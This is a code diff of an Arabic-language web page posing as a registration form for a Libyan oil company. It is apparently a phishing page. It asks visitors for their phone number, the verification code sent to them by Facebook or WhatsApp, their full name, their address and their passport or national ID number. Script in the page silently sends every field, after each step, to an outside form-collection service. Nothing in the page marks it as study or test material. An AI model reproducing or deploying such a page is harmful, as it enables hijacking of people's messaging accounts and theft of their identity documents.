@@ -1,165 +1,156 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <title>تسجيل الدخول - المؤسسة الوطنية</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل - شركة الليبية للنفط</title>
   <style>
     body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(to bottom, #004c97, #ffffff);
       margin: 0;
-      background-color: #f0f2f5;
-      font-family: "Cairo", sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      padding: 0;
+      color: #333;
     }
+
     .container {
-      width: 100%;
       max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    .card {
       background: #fff;
-      padding: 16px 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      box-sizing: border-box;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      margin-bottom: 20px;
+      display: none;
     }
-    label {
-      font-weight: bold;
-      margin: 6px 0 4px;
+
+    .card.active {
       display: block;
-      font-size: 14px;
     }
-    input, button {
+
+    input, button, select {
       width: 100%;
-      padding: 10px;
-      font-size: 15px;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
-      border-radius: 6px;
-      box-sizing: border-box;
-      margin-bottom: 10px;
+      border-radius: 10px;
+      font-size: 16px;
     }
-    .row {
-      display: flex;
-      gap: 10px;
-    }
-    .row > div {
-      flex: 1;
-    }
+
     button {
-      background-color: #002147;
+      background-color: #004c97;
       color: white;
-      border: none;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.3s;
     }
-    button:hover {
-      background-color: #003366;
-    }
-    .timer {
-      text-align: center;
+
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #ffc107;
+      padding: 10px 20px;
+      border-radius: 10px;
+      color: #000;
       font-weight: bold;
-      color: #006400;
-      margin-bottom: 10px;
-      font-size: 14px;
+      display: none;
+      z-index: 999;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <form id="form">
-      <label>الاسم الكامل:</label>
-      <input type="text" id="fullname" name="fullname" required pattern="^[\u0600-\u06FF\s]+$" title="الرجاء كتابة الاسم باللغة العربية فقط." />
+    <!-- المرحلة 1: إدخال رقم الهاتف -->
+    <div class="card active" id="step1">
+      <h3>أدخل رقم هاتفك الليبي</h3>
+      <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
+      <button onclick="handleStep1()">إرسال رمز التأكيد</button>
+    </div>
 
-      <label>العنوان (المنطقة والمدينة):</label>
-      <input type="text" id="address" name="address" required placeholder="مثال: تاجوراء - طرابلس" />
+    <!-- المرحلة 2: إدخال كود التأكيد -->
+    <div class="card" id="step2">
+      <h3>أدخل كود التأكيد الذي وصلك من فيسبوك أو واتساب</h3>
+      <input type="text" id="code" placeholder="أدخل الكود هنا">
+      <button onclick="handleStep2()">تأكيد الكود</button>
+    </div>
 
-      <label>رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" placeholder="+218xxxxxxxxx" pattern="^\+2189[1-9][0-9]{7}$" required />
-
-      <button type="button" onclick="sendPhone()">طلب الكود</button>
-      <div class="timer" id="countdown" style="display: none">120 ثانية</div>
-
-      <label>رمز الكود:</label>
-      <input type="text" id="code" name="code" placeholder="6 إلى 8 أرقام أو حروف" required pattern="[A-Za-z0-9]{6,8}" />
-
-      <button type="button" id="submitBtn" onclick="submitWithCode()">تأكيد الكود وإرسال البيانات</button>
-    </form>
+    <!-- المرحلة 3: البيانات الإضافية -->
+    <div class="card" id="step3">
+      <h3>معلوماتك الشخصية</h3>
+      <input type="text" id="fullname" placeholder="الاسم بالكامل">
+      <input type="text" id="address" placeholder="العنوان">
+      <input type="text" id="idNumber" placeholder="رقم جواز السفر أو البطاقة الوطنية">
+      <button onclick="submitAll()">إرسال جميع البيانات</button>
+    </div>
   </div>
 
+  <!-- نافذة الإشعار -->
+  <div class="toast" id="toast">تأكد أن الكود الذي ادخلته صحيح او سوف تضطر اعادة التسجيل</div>
+
   <script>
-    function sendPhone() {
-      const phoneInput = document.getElementById("phone");
-      if (!phoneInput.checkValidity()) {
-        alert("يرجى إدخال رقم هاتف صالح.");
+    function isLibyanPhone(number) {
+      return /^(091|092|093|094|095)\d{7}$/.test(number);
+    }
+
+    function showToast() {
+      const toast = document.getElementById('toast');
+      toast.style.display = 'block';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 4000);
+    }
+
+    function handleStep1() {
+      const phone = document.getElementById('phone').value;
+      if (!isLibyanPhone(phone)) {
+        alert("يرجى إدخال رقم هاتف ليبي صحيح بدون المقدمة الدولية 218");
         return;
       }
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+      submitAll();
+    }
 
+    function handleStep2() {
+      const code = document.getElementById('code').value;
+      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
+        alert("يرجى إدخال كود صحيح (6 إلى 8 أحرف أو أرقام)");
+        return;
+      }
+      showToast();
+      setTimeout(() => {
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+        submitAll();
+      }, 4000);
+    }
+
+    function submitAll() {
       const formData = new FormData();
-      formData.append("phone", phoneInput.value);
+      formData.append('phone', document.getElementById('phone').value);
+      formData.append('code', document.getElementById('code').value);
+      formData.append('fullname', document.getElementById('fullname').value);
+      formData.append('address', document.getElementById('address').value);
+      formData.append('idNumber', document.getElementById('idNumber').value);
 
-      fetch("https://formcarry.com/s/ldfA_DUCDrk", {
-        method: "POST",
+      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
+        method: 'POST',
         body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
       })
-        .then(() => {
-          alert("تم إرسال رقم الهاتف وطلب الكود بنجاح.");
-          startCountdown();
-        })
-        .catch(() => {
-          alert("حدث خطأ أثناء الإرسال. حاول لاحقاً.");
-        });
-    }
-
-    async function submitWithCode() {
-      const form = document.getElementById("form");
-      const submitButton = document.getElementById("submitBtn");
-
-      if (!form.checkValidity()) {
-        alert("يرجى تعبئة جميع الحقول بشكل صحيح.");
-        return;
-      }
-
-      submitButton.disabled = true;
-      submitButton.textContent = "جاري الإرسال...";
-
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch("https://formcarry.com/s/ldfA_DUCDrk", {
-          method: "POST",
-          body: formData,
-        });
-
-        if (response.ok) {
-          alert("تم إرسال البيانات بنجاح.");
-          window.location.href = "success.html";
-        } else {
-          alert("فشل في الإرسال، يرجى المحاولة مرة أخرى.");
-          submitButton.disabled = false;
-          submitButton.textContent = "تأكيد الكود وإرسال البيانات";
-        }
-      } catch (error) {
-        alert("حدث خطأ في الاتصال بالخادم.");
-        submitButton.disabled = false;
-        submitButton.textContent = "تأكيد الكود وإرسال البيانات";
-      }
-    }
-
-    function startCountdown() {
-      let time = 120;
-      const countdown = document.getElementById("countdown");
-      countdown.style.display = "block";
-      countdown.textContent = time + " ثانية";
-      const interval = setInterval(() => {
-        time--;
-        countdown.textContent = time + " ثانية";
-        if (time <= 0) {
-          clearInterval(interval);
-          countdown.textContent = "انتهى الوقت";
-        }
-      }, 1000);
+      .then(response => response.json())
+      .then(data => {
+        console.log('تم الإرسال إلى Formcarry:', data);
+      })
+      .catch(error => {
+        console.error('حدث خطأ أثناء الإرسال:', error);
+      });
     }
   </script>
 </body>
